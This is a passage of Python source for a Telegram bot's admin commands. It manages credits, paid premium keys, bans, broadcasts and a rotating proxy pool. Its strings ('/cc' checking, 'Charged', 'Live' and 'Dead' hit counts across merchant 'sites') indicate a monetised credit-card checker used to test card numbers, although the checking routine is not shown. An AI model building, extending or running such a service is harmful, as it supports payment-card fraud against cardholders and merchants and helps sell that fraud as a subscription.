        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply("❌ Invalid user_id or amount", parse_mode='html')
    
    remove_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(
        f"✅ <b>Credits Removed!</b>\n\n"
        f"User: <code>{target_id}</code>\n"
        f"Removed: {amount}\n"
        f"New Total: {new_total}",
        parse_mode='html'
    )
    
    try:
        await bot.send_message(
            target_id,
            f"⚠️ <b>{amount} Credits Removed!</b>\n\nYour new balance: {new_total} credits",
            parse_mode='html'
        )
    except Exception:
        pass


# ========== ADMIN: REMOVE PREMIUM ==========

@bot.on(events.NewMessage(pattern=r'^/removepremium(@\w+)?(\s+.*)?$'))
async def remove_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/removepremium user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    premium_data = load_premium_users()
    if str(target_id) in premium_data:
        del premium_data[str(target_id)]
        save_premium_users(premium_data)
        await event.reply(
            f"✅ <b>Premium removed!</b>\n\nUser: <code>{target_id}</code>",
            parse_mode='html'
        )
        try:
            await bot.send_message(
                target_id,
                "⚠️ <b>Premium Access Removed!</b>\n\nYour premium access has been revoked.",
                parse_mode='html'
            )
        except Exception:
            pass
    else:
        await event.reply(
            f"❌ User <code>{target_id}</code> does not have premium",
            parse_mode='html'
        )


# ========== ADMIN: ADD PROXY ==========

@bot.on(events.NewMessage(pattern=r'^/addproxy(@\w+)?(\s+.*)?$'))
async def add_proxy_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply(
            "❌ Usage: <code>/addproxy proxy_ip:port</code>\n\n"
            "OR send multiple proxies one per line:\n"
            "<code>/addproxy\n1.2.3.4:8080\n5.6.7.8:9090</code>",
            parse_mode='html'
        )
    
    proxy_text = args[1].strip()
    proxy_lines = [line.strip() for line in proxy_text.split('\n') if line.strip()]
    
    new_proxies = []
    already_exist = []
    current_proxies = load_proxies()
    
    for proxy in proxy_lines:
        if proxy not in current_proxies:
            new_proxies.append(proxy)
        else:
            already_exist.append(proxy)
    
    if new_proxies:
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
    
    msg = f"<b>🏆 Proxy Add Result</b>\n\n"
    msg += f"✅ Added: {len(new_proxies)}\n"
    msg += f"⚠️ Already existed: {len(already_exist)}\n"
    if new_proxies and len(new_proxies) <= 20:
        msg += f"\n<u>Added:</u>\n"
        for p in new_proxies:
            msg += f"👉 <code>{p}</code>\n"
    
    await event.reply(msg, parse_mode='html')


# ========== ADMIN: ADD PROXIES FROM TXT ==========

@bot.on(events.NewMessage(pattern=r'^/addproxytxt(@\w+)?(\s+.*)?$'))
async def add_proxy_txt_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply("📎 Reply to a .txt file with proxies (one per line)", parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply("❌ Please reply to a .txt file", parse_mode='html')
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except Exception:
            pass
        return await event.reply(f"❌ Error reading file: {e}", parse_mode='html')
    
    proxy_lines = [line.strip() for line in content.splitlines() if line.strip()]
    if not proxy_lines:
        return await event.reply("❌ No valid proxies found in file", parse_mode='html')
    
    current_proxies = load_proxies()
    new_proxies = []
    already_exist = []
    
    for proxy in proxy_lines:
        if proxy not in current_proxies:
            new_proxies.append(proxy)
        else:
            already_exist.append(proxy)
    
    if new_proxies:
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
    
    msg = f"<b>🏆 Proxies Processed</b>\n\n"
    msg += f"✅ Added: {len(new_proxies)}\n"
    msg += f"⚠️ Already existed: {len(already_exist)}\n"
    if new_proxies and len(new_proxies) <= 20:
        msg += f"\n<u>Added:</u>\n"
        for p in new_proxies:
            msg += f"👉 <code>{p}</code>\n"
    
    await event.reply(msg, parse_mode='html')


# ========== ADMIN: CHECK SINGLE PROXY ==========

@bot.on(events.NewMessage(pattern=r'^/chkproxy(@\w+)?(\s+.*)?$'))
async def chkproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/chkproxy proxy_ip:port</code>", parse_mode='html')
    
    proxy = args[1].strip()
    status_msg = await event.reply(f"🔥 Checking proxy: <code>{proxy}</code>...", parse_mode='html')
    
    result = await test_proxy(proxy)
    
    if result['status'] == 'alive':
        await status_msg.edit(f"✅ <b>Proxy Alive!</b>\n\n<code>{proxy}</code>", parse_mode='html')
    else:
        await status_msg.edit(f"❌ <b>Proxy Dead!</b>\n\n<code>{proxy}</code>", parse_mode='html')


# ========== ADMIN: REMOVE PROXY ==========

@bot.on(events.NewMessage(pattern=r'^/rmproxy(@\w+)?(\s+.*)?$'))
async def remove_proxy_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rmproxy proxy_ip:port</code>", parse_mode='html')
    
    target = args[1].strip()
    proxies = load_proxies()
    
    if target not in proxies:
        return await event.reply("❌ Proxy not found!", parse_mode='html')
    
    proxies.remove(target)
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies:
            await f.write(f"{p}\n")
    
    await event.reply(f"✅ <b>Proxy removed!</b>\n\n<code>{target}</code>", parse_mode='html')


# ========== ADMIN: REMOVE PROXY BY INDEX ==========

@bot.on(events.NewMessage(pattern=r'^/rmproxyindex(@\w+)?(\s+.*)?$'))
async def rmproxyindex_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rmproxyindex 1,2,3</code>", parse_mode='html')
    
    index_str = args[1].strip()
    try:
        indices = [int(i.strip()) for i in index_str.split(',')]
    except Exception:
        return await event.reply(
            "❌ Use comma-separated indices, e.g., <code>1,2,3</code>",
            parse_mode='html'
        )
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ No proxies to remove!", parse_mode='html')
    
    removed = []
    invalid = []
    valid_indices = []
    
    for idx in indices:
        actual_idx = idx - 1
        if 0 <= actual_idx < len(proxies):
            valid_indices.append(actual_idx)
        else:
            invalid.append(str(idx))
    
    if not valid_indices:
        return await event.reply(
            f"❌ No valid indices! Total proxies: {len(proxies)}",
            parse_mode='html'
        )
    
    valid_indices.sort(reverse=True)
    for idx in valid_indices:
        removed.append(proxies[idx])
        del proxies[idx]
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies:
            await f.write(f"{p}\n")
    
    msg = f"✅ <b>Proxies Removed!</b>\n\n"
    msg += f"Removed: {len(removed)}\n"
    if invalid:
        msg += f"Invalid indices: {', '.join(invalid)}\n"
    if remaining := len(proxies):
        msg += f"Remaining: {remaining}\n"
    if removed and len(removed) <= 10:
        msg += f"\n<u>Removed:</u>\n"
        for p in removed:
            msg += f"👉 <code>{p}</code>\n"
    
    await event.reply(msg, parse_mode='html')


# ========== ADMIN: CLEAR ALL PROXIES ==========

@bot.on(events.NewMessage(pattern=r'^/clearproxy(@\w+)?(\s+.*)?$'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    current_proxies = load_proxies()
    count = len(current_proxies)
    
    if count == 0:
        return await event.reply("❌ <code>proxy.txt</code> is already empty.", parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        
        await event.reply(
            f"✅ <b>Backup Created!</b>\n\nSending backup of {count} proxies before clearing...",
            file=backup_filename,
            parse_mode='html'
        )
        
        try:
            os.remove(backup_filename)
        except Exception:
            pass
    except Exception as e:
        return await event.reply(f"❌ Error creating backup: {e}", parse_mode='html')
    
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    
    await event.reply(
        f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty.",
        parse_mode='html'
    )


# ========== ADMIN: GET ALL PROXIES ==========

@bot.on(events.NewMessage(pattern=r'^/getproxy(@\w+)?(\s+.*)?$'))
async def get_all_proxies_cmd(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    current_proxies = load_proxies()
    if not current_proxies:
        return await event.reply("❌ No proxies in <code>proxy.txt</code>", parse_mode='html')
    
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(
            f"<b>🔥 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}",
            parse_mode='html'
        )
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        
        await event.reply(
            f"<b>🔥 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below.",
            file=filename,
            parse_mode='html'
        )
        
        try:
            os.remove(filename)
        except Exception:
            pass


# ========== ADMIN: GEN PREMIUM KEY ==========

@bot.on(events.NewMessage(pattern=r'^/genpremiumkey(@\w+)?(\s+.*)?$'))
async def gen_premium_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            plan_key = args[2].lower()
            if plan_key not in PLANS:
                return await event.reply(
                    f"❌ Invalid plan! Available: {', '.join(PLANS.keys())}, custom",
                    parse_mode='html'
                )
        except Exception:
            return await event.reply(
                "❌ Usage: <code>/genpremiumkey amount plan</code>\n\n"
                "Example: <code>/genpremiumkey 5 gold</code>",
                parse_mode='html'
            )
        
        if amount > 50:
            return await event.reply("❌ Maximum 50 keys at once!", parse_mode='html')
        
        keys_generated = []
        days = PLANS[plan_key]['days']
        credits = PLANS[plan_key]['credits']
        for i in range(amount):
            key = generate_premium_key(plan_key, days, credits)
            keys_generated.append(key)
        
        plan = PLANS[plan_key]
        keys_text = "\n".join([f"👉 <code>{k}</code>" for k in keys_generated])
        msg = (
            f"✅ <b>Premium Keys Generated Successfully!</b>\n\n"
            f"<b>🏆 Summary:</b>\n"
            f"👉 Quantity: {amount}\n"
            f"👉 Plan: {plan['name']}\n"
            f"👉 Days: {plan['days']}\n"
            f"👉 Credits: {plan['credits']}\n"
            f"👉 Price: {plan['price']} each\n\n"
            f"<b>🏅 Generated Keys:</b>\n"
            f"{keys_text}\n\n"
            f"<b>⚠️ Note:</b> Share these keys with users. "
            f"They can redeem using <code>/redeem KEY</code>"
        )
        await event.reply(msg, parse_mode='html')
    
    elif len(args) == 5 and args[2].lower() == "custom":
        try:
            amount = int(args[1])
            days = int(args[3])
            credits = int(args[4])
            if amount <= 0 or days <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply("❌ Maximum 50 keys at once!", parse_mode='html')
        except Exception:
            return await event.reply(
                "❌ Usage: <code>/genpremiumkey amount custom days credits</code>\n\n"
                "Example: <code>/genpremiumkey 5 custom 15 5000</code>",
                parse_mode='html'
            )
        
        keys_generated = []
        for i in range(amount):
            key = generate_premium_key("custom", days, credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"👉 <code>{k}</code>" for k in keys_generated])
        msg = (
            f"✅ <b>Custom Premium Keys Generated Successfully!</b>\n\n"
            f"<b>🏆 Summary:</b>\n"
            f"👉 Quantity: {amount}\n"
            f"👉 Days: {days} per key\n"
            f"👉 Credits: {credits} per key\n\n"
            f"<b>🏅 Generated Keys:</b>\n"
            f"{keys_text}\n\n"
            f"<b>⚠️ Note:</b> Share these keys with users. "
            f"They can redeem using <code>/redeem KEY</code>"
        )
        await event.reply(msg, parse_mode='html')
    
    else:
        await event.reply(
            "❌ Usage:\n"
            "<code>/genpremiumkey amount plan</code>\n"
            "Example: <code>/genpremiumkey 5 gold</code>\n\n"
            "OR\n\n"
            "<code>/genpremiumkey amount custom days credits</code>\n"
            "Example: <code>/genpremiumkey 5 custom 15 5000</code>",
            parse_mode='html'
        )


# ========== ADMIN: GEN CREDIT KEY ==========

@bot.on(events.NewMessage(pattern=r'^/gencreditkey(@\w+)?(\s+.*)?$'))
async def gen_credit_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            credits = int(args[2])
            if amount <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply("❌ Maximum 50 keys at once!", parse_mode='html')
        except Exception:
            return await event.reply(
                "❌ Usage: <code>/gencreditkey amount credits</code>\n\n"
                "Example: <code>/gencreditkey 5 5000</code>",
                parse_mode='html'
            )
        
        keys_generated = []
        for i in range(amount):
            key = generate_credit_key(credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"👉 <code>{k}</code>" for k in keys_generated])
        msg = (
            f"✅ <b>Credit Keys Generated Successfully!</b>\n\n"
            f"<b>🏆 Summary:</b>\n"
            f"👉 Quantity: {amount}\n"
            f"👉 Credits: {credits} per key\n\n"
            f"<b>🏅 Generated Keys:</b>\n"
            f"{keys_text}\n\n"
            f"<b>⚠️ Note:</b> Share these keys with users. "
            f"They can redeem using <code>/redeemcredit KEY</code> "
            f"to get {credits} credits only (no premium)!"
        )
        await event.reply(msg, parse_mode='html')
    
    else:
        await event.reply(
            "❌ Usage: <code>/gencreditkey amount credits</code>\n"
            "Example: <code>/gencreditkey 5 5000</code>",
            parse_mode='html'
        )


# ========== ADMIN: BAN / UNBAN ==========

@bot.on(events.NewMessage(pattern=r'^/ban(@\w+)?(\s+.*)?$'))
async def ban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/ban user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    ban_user(target_id)
    await event.reply(f"✅ <b>User banned!</b>\n\nUser: <code>{target_id}</code>", parse_mode='html')
    
    try:
        await bot.send_message(
            target_id,
            "🔴 <b>You have been banned!</b>\n\nYou can no longer use this bot.",
            parse_mode='html'
        )
    except Exception:
        pass


@bot.on(events.NewMessage(pattern=r'^/unban(@\w+)?(\s+.*)?$'))
async def unban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/unban user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    unban_user(target_id)
    await event.reply(f"✅ <b>User unbanned!</b>\n\nUser: <code>{target_id}</code>", parse_mode='html')
    
    try:
        await bot.send_message(
            target_id,
            "✅ <b>You have been unbanned!</b>\n\nYou can now use the bot again.",
            parse_mode='html'
        )
    except Exception:
        pass


# ========== ADMIN: GROUP MODE ==========

@bot.on(events.NewMessage(pattern=r'^/groupmode(@\w+)?(\s+.*)?$'))
async def groupmode_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.is_group:
        return await event.reply("❌ <b>This command only works in groups!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/groupmode on/off</code>", parse_mode='html')
    
    action = args[1].lower()
    chat_id = event.chat_id
    
    if action == 'on':
        set_group_enabled(chat_id, True)
        await event.reply(
            "✅ <b>Bot enabled in this group!</b>\n\nUsers can now use /cc for free checking.",
            parse_mode='html'
        )
    elif action == 'off':
        set_group_enabled(chat_id, False)
        await event.reply("✅ <b>Bot disabled in this group!</b>", parse_mode='html')
    else:
        await event.reply("❌ Usage: <code>/groupmode on/off</code>", parse_mode='html')


# ========== ADMIN: STATS ==========

@bot.on(events.NewMessage(pattern=r'^/stats(@\w+)?(\s+.*)?$'))
async def stats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    credits_data = load_credits()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()
    
    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)
    total_credits = sum(credits_data.values())
    
    msg = f"<b>🏆 Bot Statistics</b>\n\n"
    msg += f"<b>👥 Users:</b>\n"
    msg += f"👉 Premium Users: {total_premium}\n"
    msg += f"👉 Banned Users: {total_banned}\n\n"
    msg += f"<b>💰 Credits:</b>\n"
    msg += f"👉 Total Credits Active: {total_credits}\n\n"
    msg += f"<b>🏅 Premium Keys:</b>\n"
    msg += f"👉 Total Generated: {total_keys}\n"
    msg += f"👉 Used: {used_premium_keys}\n"
    msg += f"👉 Unused: {total_keys - used_premium_keys}\n\n"
    msg += f"<b>🏆 Credit Keys:</b>\n"
    msg += f"👉 Total Generated: {total_credit_keys}\n"
    msg += f"👉 Used: {used_credit_keys}\n"
    msg += f"👉 Unused: {total_credit_keys - used_credit_keys}\n\n"
    msg += f"<b>✅ Data:</b>\n"
    msg += f"👉 Sites: {total_sites}\n"
    msg += f"👉 Proxies: {total_proxies}\n\n"
    msg += f"<b>🔥 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
    msg += f'🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    
    await event.reply(msg, parse_mode='html')


# ========== ADMIN: ALL STATS ==========

@bot.on(events.NewMessage(pattern=r'^/allstats(@\w+)?(\s+.*)?$'))
async def allstats_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    stats_data = load_hit_stats()
    premium_data = load_premium_users()
    credits_data = load_credits()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    
    total_charged = sum(data.get('charged', 0) for data in stats_data.values())
    total_approved = sum(data.get('approved', 0) for data in stats_data.values())
    total_dead = sum(data.get('dead', 0) for data in stats_data.values())
    total_all = sum(data.get('total', 0) for data in stats_data.values())
    
    total_premium = len(premium_data)
    total_credits = sum(credits_data.values())
    total_premium_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used'))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used'))
    
    text = (
        f"<b>🏆 COMPLETE BOT STATISTICS</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>🔥 HIT STATISTICS</b>\n"
        f"<blockquote>💣 Charged: {total_charged}\n"
        f"✅ Live: {total_approved}\n"
        f"❌ Dead: {total_dead}\n"
        f"🏆 Grand Total: {total_all}</blockquote>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>👥 USER STATISTICS</b>\n"
        f"<blockquote>Premium Users: {total_premium}\n"
        f"Total Credits Active: {total_credits}</blockquote>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🏅 KEY STATISTICS</b>\n"
        f"<blockquote>Premium Keys (Total/Used): {total_premium_keys}/{used_premium_keys}\n"
        f"Credit Keys (Total/Used): {total_credit_keys}/{used_credit_keys}</blockquote>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>✅ DATA</b>\n"
        f"<blockquote>Sites: {len(load_sites())}\n"
        f"Proxies: {len(load_proxies())}\n"
        f"Banned: {len(load_banned_users())}</blockquote>\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f'🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await event.reply(text, parse_mode='html')


# ========== ADMIN: USER LIST ==========

@bot.on(events.NewMessage(pattern=r'^/userlist(@\w+)?(\s+.*)?$'))
async def userlist_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    premium_data = load_premium_users()
    if not premium_data:
        return await event.reply("❌ No premium users found.", parse_mode='html')
    
    users_list = []
    for uid_str, info in premium_data.items():
        try:
            expiry_dt = datetime.fromisoformat(info['expiry'])
            days_left = (expiry_dt - datetime.now()).days
        except Exception:
            days_left = "Unknown"
        
        users_list.append({
            'uid': uid_str,
            'plan': info.get('plan_key', 'custom'),
            'days_left': days_left,
            'credit_balance': get_user_credits(int(uid_str))
        })
    
    users_list.sort(key=lambda x: x['days_left'] if isinstance(x['days_left'], int) else -1, reverse=True)
    
    total = len(users_list)
    chunk_size = 30
    
    await event.reply(f"🏅 <b>Premium Users ({total})</b>\n\nSending in chunks...", parse_mode='html')
    
    for i in range(0, total, chunk_size):
        chunk = users_list[i:i + chunk_size]
        chunk_text = f"<b>🏅 Premium Users ({i + 1}-{min(i + chunk_size, total)} of {total})</b>\n\n"
        
        for u in chunk:
            plan_name = PLANS.get(u['plan'], {}).get('name', 'CUSTOM')
            chunk_text += (
                f"👉 <code>{u['uid']}</code> | {plan_name} | "
                f"⏳ {u['days_left']}d | 💰 {u['credit_balance']}\n"
            )
        
        await event.reply(chunk_text, parse_mode='html')
        await asyncio.sleep(0.5)


# ========== ADMIN: CHECK CREDITS ==========

@bot.on(events.NewMessage(pattern=r'^/checkcredits(@\w+)?(\s+.*)?$'))
async def check_credits_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/checkcredits user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except Exception:
        return await event.reply("❌ Invalid user_id.", parse_mode='html')
    
    credits = get_user_credits(target_id)
    is_prem = is_premium(target_id)
    plan_name = get_user_plan_name(target_id)
    
    await event.reply(
        f"<b>✅ User Credits Check</b>\n\n"
        f"User: <code>{target_id}</code>\n"
        f"Plan: {plan_name}\n"
        f"Credits: {credits}\n"
        f"Premium: {'Yes' if is_prem else 'No'}",
        parse_mode='html'
    )


# ========== ADMIN: SET CREDITS ==========

@bot.on(events.NewMessage(pattern=r'^/setcredits(@\w+)?(\s+.*)?$'))
async def set_credits_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/setcredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply("❌ Invalid user_id or amount.", parse_mode='html')
    
    if amount < 0:
        return await event.reply("❌ Amount cannot be negative!", parse_mode='html')
    
    credits_data = load_credits()
    credits_data[str(target_id)] = amount
    save_credits(credits_data)
    
    await event.reply(
        f"✅ <b>Credits Set!</b>\n\nUser: <code>{target_id}</code>\nCredits: {amount}",
        parse_mode='html'
    )


# ========== ADMIN: EXPORT STATS ==========

@bot.on(events.NewMessage(pattern=r'^/exportstats(@\w+)?(\s+.*)?$'))
async def export_stats_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    stats_data = load_hit_stats()
    if not stats_data:
        return await event.reply("❌ No stats data available.", parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"export_stats_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 60 + "\n")
        await f.write("FULL STATISTICS REPORT\n")
        await f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        await f.write("=" * 60 + "\n\n")
        
        sorted_stats = sorted(stats_data.items(), key=lambda x: x[1].get('total', 0), reverse=True)
        
        for uid, data in sorted_stats:
            await f.write(f"User: {uid}\n")
            await f.write(f"  Charged: {data.get('charged', 0)}\n")
            await f.write(f"  Approved: {data.get('approved', 0)}\n")
            await f.write(f"  Dead: {data.get('dead', 0)}\n")
            await f.write(f"  Total: {data.get('total', 0)}\n")
            await f.write("-" * 40 + "\n")
    
    await event.reply(
        f"🏆 <b>Stats Exported!</b>\n\nTotal users with data: {len(stats_data)}",
        file=filename,
        parse_mode='html'
    )
    
    try:
        os.remove(filename)
    except Exception:
        pass


# ========== ADMIN: ACTIVE CHECK ==========

@bot.on(events.NewMessage(pattern=r'^/activecheck(@\w+)?(\s+.*)?$'))
async def activecheck_admin(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    active_users = list(_user_active_sessions.keys())
    
    if not active_users:
        return await event.reply("🏆 <b>No active checking sessions!</b>", parse_mode='html')
    
    text = f"<b>🏆 Active Checking Sessions ({len(active_users)})</b>\n\n"
    
    for uid in active_users:
        plan_name = get_user_plan_name(uid)
        credits = get_user_credits(uid)
        text += f"👉 <code>{uid}</code> | {plan_name} | 💰 {credits} credits\n"
    
    await event.reply(text, parse_mode='html')


# ========== ADMIN: BROADCAST ==========

@bot.on(events.NewMessage(pattern=r'^/broadcast(@\w+)?(\s+.*)?$'))
async def broadcast_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    broadcast_msg = event.message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_msg:
        return await event.reply("❌ Usage: <code>/broadcast message</code>", parse_mode='html')
    
    premium_users = load_premium_users()
    credits_users = load_credits()
    
    all_user_ids = set()
    
    for uid_str in premium_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid_str in credits_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid in joined_users:
        all_user_ids.add(uid)
    
    for aid in ADMIN_IDS:
        all_user_ids.add(aid)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(f"✅ Broadcasting to {len(all_user_ids)} users...", parse_mode='html')
    
    for uid in all_user_ids:
        try:
            await bot.send_message(
                uid,
                f"📢 <b>Broadcast from Admin</b>\n\n{broadcast_msg}",
                parse_mode='html'
            )
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.1)
    
    await status_msg.edit(
        f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}",
        parse_mode='html'
    )


# ========== CALLBACK: PAUSE / RESUME / STOP ==========

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_callback(event):
    user_id = event.sender_id
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_") and key in active_sessions:
            active_sessions[key]['paused'] = True
            await event.answer("⏸️ Checker Paused!", alert=True)
            return
    await event.answer("No active session found.", alert=True)


@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_callback(event):
    user_id = event.sender_id
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_") and key in active_sessions:
